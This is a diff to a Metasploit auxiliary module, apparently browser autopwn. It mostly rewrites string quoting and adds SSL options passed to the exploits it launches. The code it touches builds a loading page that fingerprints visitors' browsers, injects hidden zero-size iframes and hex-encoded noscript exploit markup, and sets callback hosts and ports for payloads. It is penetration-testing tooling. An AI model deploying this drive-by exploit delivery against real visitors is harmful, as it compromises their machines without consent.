@@ -13,10 +13,6 @@
 #	- add a loading page option so the user can specify arbitrary html to
 #	  insert all of the evil js and iframes into
 #	- caching is busted when different browsers come from the same IP
-#	- some kind of version comparison for each browser
-#		- is a generic comparison possible?
-#			9.1 < 9.10 < 9.20b < 9.20
-#			3.5-pre < 3.5 < 3.5.1
 
 require 'msf/core'
 require 'rex/exploitation/javascriptosdetect'
@@ -221,17 +217,17 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		#@init_js << "window.onload = #{@init_js.sym("bodyOnLoad")};";
-		@init_html  = "<html > <head > <title > Loading </title>\n"
-		@init_html << '<script language="javascript" type="text/javascript">'
-		@init_html << "<!-- \n #{@init_js} //-->"
-		@init_html << "</script> </head> "
-		@init_html << "<body onload=\"#{@init_js.sym("bodyOnLoad")}()\"> "
-		@init_html << "<noscript> \n"
+		@init_html  = %Q|<html > <head > <title > Loading </title>\n|
+		@init_html << %Q|<script language="javascript" type="text/javascript">|
+		@init_html << %Q|<!-- \n #{@init_js} //-->|
+		@init_html << %Q|</script> </head> |
+		@init_html << %Q|<body onload="#{@init_js.sym("bodyOnLoad")}()"> |
+		@init_html << %Q|<noscript> \n|
 		# Don't use build_iframe here because it will break detection in
 		# DefangedDetection mode when the target has js disabled.
-		@init_html << "<iframe src=\"#{self.get_resource}?ns=1\"></iframe>"
-		@init_html << "</noscript> \n"
-		@init_html << "</body> </html> "
+		@init_html << %Q|<iframe src="#{self.get_resource}?ns=1"></iframe>|
+		@init_html << %Q|</noscript> \n|
+		@init_html << %Q|</body> </html> |
 
 		#
 		# I'm still not sold that this is the best way to do this, but random
@@ -306,6 +302,8 @@ class Metasploit3 < Msf::Auxiliary
 		@exploits[name].datastore['MODULE_OWNER'] = self.owner
 		@exploits[name].datastore['LPORT'] = lport
 		@exploits[name].datastore['LHOST'] = @lhost
+		@exploits[name].datastore['SSL'] = datastore['SSL']
+		@exploits[name].datastore['SSLVersion'] = datastore['SSLVersion']
 		@exploits[name].datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
 		@exploits[name].datastore['DisablePayloadHandler'] = true
 		@exploits[name].exploit_simple(
@@ -712,14 +710,14 @@ class Metasploit3 < Msf::Auxiliary
 				opts['Symbols']['Methods'].push("#{func_name}")
 			end
 		}
-		js << "var noscript_exploits = \""
+		js << %q|var noscript_exploits = "|
 		js << Rex::Text.to_hex(build_noscript_html(cli, request), "%")
-		js << "\";"
-		js << 'noscript_div = document.createElement("div");'
-		js << "noscript_div.innerHTML = unescape(noscript_exploits);"
-		js << "document.body.appendChild(noscript_div);"
+		js << %q|";|
+		js << %q|noscript_div = document.createElement("div");|
+		js << %q|noscript_div.innerHTML = unescape(noscript_exploits);|
+		js << %q|document.body.appendChild(noscript_div);|
 
-		#js << "document.write(\"<div>\" + noscript_exploits);"
+		#js << %q|document.write("<div>" + noscript_exploits);|
 		opts['Symbols']['Methods'].push("noscript_exploits")
 		opts['Symbols']['Methods'].push("noscript_div")
 		js << "#{js_debug("'starting exploits<br>'")}\n"
@@ -822,8 +820,8 @@ class Metasploit3 < Msf::Auxiliary
 		if (action.name == 'DefangedDetection')
 			ret << "<p>iframe #{resource}</p>"
 		else
-			ret << "<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>"
-			#ret << "<iframe src=\"#{resource}\" ></iframe>"
+			ret << %Q|<iframe src="#{resource}" style="visibility:hidden" height="0" width="0" border="0"></iframe>|
+			#ret << %Q|<iframe src="#{resource}" ></iframe>|
 		end
 		return ret
 	end
